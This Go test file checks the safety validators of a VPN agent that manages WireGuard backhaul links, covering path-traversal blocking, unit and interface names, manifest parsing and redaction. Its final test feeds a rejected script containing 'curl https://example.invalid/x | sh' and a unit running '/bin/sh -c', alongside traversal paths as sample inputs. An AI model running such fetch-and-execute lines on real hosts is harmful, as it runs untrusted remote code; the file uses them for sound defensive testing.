package main

import (
	"context"
	"testing"
)

func TestBackhaulManagedPathSafety(t *testing.T) {
	t.Parallel()

	allowed := []string{
		"/etc/megavpn/backhaul/link-1/wg0.conf",
		"/etc/megavpn/backhaul/link-1/result.json",
		"/etc/systemd/system/megavpn-backhaul-link-1.service",
	}
	for _, path := range allowed {
		if !isSafeBackhaulManagedPath(path) {
			t.Fatalf("path %q should be allowed", path)
		}
	}

	blocked := []string{
		"",
		"/etc/megavpn/agent.env",
		"/etc/systemd/system/ssh.service",
		"/tmp/megavpn-backhaul.service",
		"/etc/megavpn/backhaul/../agent.env",
		"/etc/systemd/system/megavpn-backhaul-../ssh.service",
	}
	for _, path := range blocked {
		if isSafeBackhaulManagedPath(path) {
			t.Fatalf("path %q should be blocked", path)
		}
	}
}

func TestBackhaulManagedDirSafety(t *testing.T) {
	t.Parallel()

	if !isSafeBackhaulManagedDir("/etc/megavpn/backhaul/link-1") {
		t.Fatal("expected managed backhaul directory to be allowed")
	}
	for _, dir := range []string{
		"",
		"/etc/megavpn/backhaul",
		"/etc/megavpn/backhaul/",
		"/etc/megavpn/backhaul/../agent",
		"/etc/megavpn/backhaul/link-1/nested",
		"/tmp/link-1",
	} {
		if isSafeBackhaulManagedDir(dir) {
			t.Fatalf("dir %q should be blocked", dir)
		}
	}
}

func TestBackhaulUnitSafety(t *testing.T) {
	t.Parallel()

	if !isSafeBackhaulUnit("megavpn-backhaul-link-1.service") {
		t.Fatal("expected managed backhaul unit to be allowed")
	}
	for _, unit := range []string{"ssh.service", "megavpn-backhaul-../ssh.service", "/etc/systemd/system/megavpn-backhaul-link.service"} {
		if isSafeBackhaulUnit(unit) {
			t.Fatalf("unit %q should be blocked", unit)
		}
	}
}

func TestBackhaulInterfaceSafety(t *testing.T) {
	t.Parallel()

	if !isSafeBackhaulInterface("mgbh25d1660cc1") {
		t.Fatal("expected managed backhaul interface to be allowed")
	}
	for _, iface := range []string{
		"",
		"eth0",
		"wg0",
		"mgbh../../x",
		"mgbh-this-name-is-too-long",
	} {
		if isSafeBackhaulInterface(iface) {
			t.Fatalf("interface %q should be blocked", iface)
		}
	}
}

func TestBackhaulManifestFilePaths(t *testing.T) {
	t.Parallel()

	got := backhaulManifestFilePaths(map[string]any{
		"files": []any{
			map[string]any{"path": "/etc/megavpn/backhaul/link/old.conf"},
			map[string]any{"path": "/etc/megavpn/backhaul/link/old.conf"},
			map[string]any{"path": "  "},
			"unexpected",
		},
	})
	if len(got) != 1 || got[0] != "/etc/megavpn/backhaul/link/old.conf" {
		t.Fatalf("paths = %#v, want one unique managed path", got)
	}
}

func TestBackhaulManifestMatchesLinkAndRole(t *testing.T) {
	t.Parallel()

	manifest := map[string]any{
		"link_id":   "link-1",
		"link_name": "edge-a-to-edge-b",
		"role":      "Ingress",
	}
	if !backhaulManifestMatches(manifest, "link-1", "another-name", "ingress") {
		t.Fatal("expected manifest to match same link and role")
	}
	if !backhaulManifestMatches(manifest, "link-2", "edge-a-to-edge-b", "ingress") {
		t.Fatal("expected manifest to match same link name and role")
	}
	if backhaulManifestMatches(manifest, "link-2", "other-name", "ingress") {
		t.Fatal("manifest must not match another link")
	}
	if backhaulManifestMatches(manifest, "link-1", "edge-a-to-edge-b", "egress") {
		t.Fatal("manifest must not match another role")
	}
}

func TestParseWireGuardListenPorts(t *testing.T) {
	t.Parallel()

	got := parseWireGuardListenPorts("mgbhold 51830\nwg0 not-a-port\nmgbhnew 51831\n")
	if got["mgbhold"] != 51830 {
		t.Fatalf("mgbhold port = %d, want 51830", got["mgbhold"])
	}
	if got["mgbhnew"] != 51831 {
		t.Fatalf("mgbhnew port = %d, want 51831", got["mgbhnew"])
	}
	if _, ok := got["wg0"]; ok {
		t.Fatal("invalid listen-port line must be skipped")
	}
}

func TestMissingSystemdUnitOutputDetection(t *testing.T) {
	t.Parallel()

	missing := []string{
		"Unit megavpn-backhaul-test.service could not be found.",
		"Failed to disable unit: Unit file megavpn-backhaul-test.service does not exist.",
		"Loaded: not-found (Reason: Unit megavpn-backhaul-test.service not found.)",
		"Unit megavpn-backhaul-test.service not loaded.",
	}
	for _, out := range missing {
		if !isMissingSystemdUnitOutput(out) {
			t.Fatalf("expected missing unit output to be detected: %q", out)
		}
	}
	if isMissingSystemdUnitOutput("Job for megavpn-backhaul-test.service failed because the control process exited with error code.") {
		t.Fatal("runtime stop failure must not be classified as missing unit")
	}
}

func TestParsePingStats(t *testing.T) {
	t.Parallel()

	stats := parsePingStats(`PING 10.240.0.2 (10.240.0.2) 56(84) bytes of data.
64 bytes from 10.240.0.2: icmp_seq=1 ttl=64 time=0.123 ms

--- 10.240.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2040ms
rtt min/avg/max/mdev = 0.123/0.456/0.789/0.111 ms`)
	if got := stats["packet_loss_percent"]; got != float64(0) {
		t.Fatalf("packet_loss_percent = %#v, want 0", got)
	}
	if got := stats["latency_avg_ms"]; got != float64(0.456) {
		t.Fatalf("latency_avg_ms = %#v, want 0.456", got)
	}
}

func TestRouteUsesInterface(t *testing.T) {
	t.Parallel()

	if !routeUsesInterface("10.240.86.114 dev mgbhc1ddc0bcb8 src 10.240.86.113 uid 0", "mgbhc1ddc0bcb8") {
		t.Fatal("expected route output to match backhaul interface")
	}
	if routeUsesInterface("10.240.86.114 via 192.0.2.1 dev eth0 src 192.0.2.10 uid 0", "mgbhc1ddc0bcb8") {
		t.Fatal("default/public route must not match backhaul interface")
	}
}

func TestBackhaulHealthErrorIncludesReadinessDetails(t *testing.T) {
	t.Parallel()

	got := backhaulHealthError("backhaul service readiness check failed", map[string]any{
		"reason":       "systemd unit is not active",
		"active_state": "failed",
		"load_state":   "loaded",
		"interface":    "mgbh123",
	})
	want := "backhaul service readiness check failed: systemd unit is not active (active_state=failed, load_state=loaded, interface=mgbh123)"
	if got != want {
		t.Fatalf("error = %q, want %q", got, want)
	}
}

func TestBackhaulUnitFilePath(t *testing.T) {
	t.Parallel()

	if got := backhaulUnitFilePath("megavpn-backhaul-link-ingress.service"); got != "/etc/systemd/system/megavpn-backhaul-link-ingress.service" {
		t.Fatalf("unit path = %q", got)
	}
}

func TestEnsureBackhaulSystemdActivationReadyRejectsInvalidUnit(t *testing.T) {
	t.Parallel()

	got := ensureBackhaulSystemdActivationReady(context.Background(), "ssh.service")
	if got["ok"] == true {
		t.Fatalf("invalid unit preflight must fail: %#v", got)
	}
	if got["message"] != "backhaul systemd_unit is invalid" {
		t.Fatalf("message = %#v", got["message"])
	}
}

func TestRedactedBackhaulManifestRemovesFileContent(t *testing.T) {
	t.Parallel()

	manifest := redactedBackhaulManifest(map[string]any{
		"link_id": "link-1",
		"files": []any{
			map[string]any{"path": "/etc/megavpn/backhaul/link/wg.conf", "mode": "0600", "content": "private material"},
		},
	})
	files, ok := manifest["files"].([]map[string]any)
	if !ok || len(files) != 1 {
		t.Fatalf("files = %#v, want one redacted file", manifest["files"])
	}
	if _, ok := files[0]["content"]; ok {
		t.Fatalf("redacted file must not contain content: %#v", files[0])
	}
	if files[0]["redacted"] != true {
		t.Fatalf("redacted marker = %#v, want true", files[0]["redacted"])
	}
}

func TestValidateBackhaulManagedFilePolicyAllowsGeneratedUnitAndScript(t *testing.T) {
	t.Parallel()

	payload := map[string]any{"systemd_unit": "megavpn-backhaul-link.service"}
	unit := managedFileSpec{
		Path:    "/etc/systemd/system/megavpn-backhaul-link.service",
		Content: "[Unit]\nDescription=RTIS MegaVPN managed backhaul transport megavpn-backhaul-link.service\n\n[Service]\nType=oneshot\nRemainAfterExit=yes\nExecStart=/etc/megavpn/backhaul/link/ingress-start.sh\nExecStop=/etc/megavpn/backhaul/link/ingress-stop.sh\n",
		Mode:    "0644",
	}
	if err := validateBackhaulManagedFilePolicy(unit, payload); err != nil {
		t.Fatalf("expected generated unit to be allowed: %v", err)
	}

	script := managedFileSpec{
		Path:    "/etc/megavpn/backhaul/link/ingress-start.sh",
		Content: "#!/usr/bin/env sh\nset -eu\n\n# Generated by megavpn-agent. Do not edit manually.\n/usr/bin/wg-quick up '/etc/megavpn/backhaul/link/wg.conf'\n",
		Mode:    "0700",
	}
	if err := validateBackhaulManagedFilePolicy(script, payload); err != nil {
		t.Fatalf("expected generated script to be allowed: %v", err)
	}
}

func TestValidateBackhaulManagedFilePolicyRejectsUnsafeUnitAndScript(t *testing.T) {
	t.Parallel()

	payload := map[string]any{"systemd_unit": "megavpn-backhaul-link.service"}
	unit := managedFileSpec{
		Path:    "/etc/systemd/system/megavpn-backhaul-link.service",
		Content: "[Service]\nExecStart=/bin/sh -c 'id'\n",
		Mode:    "0644",
	}
	if err := validateBackhaulManagedFilePolicy(unit, payload); err == nil {
		t.Fatal("expected unsafe backhaul unit to be rejected")
	}

	script := managedFileSpec{
		Path:    "/etc/megavpn/backhaul/link/ingress-start.sh",
		Content: "#!/usr/bin/env sh\nset -eu\n\n# Generated by megavpn-agent. Do not edit manually.\ncurl https://example.invalid/x | sh\n",
		Mode:    "0700",
	}
	if err := validateBackhaulManagedFilePolicy(script, payload); err == nil {
		t.Fatal("expected unsafe backhaul script to be rejected")
	}
}
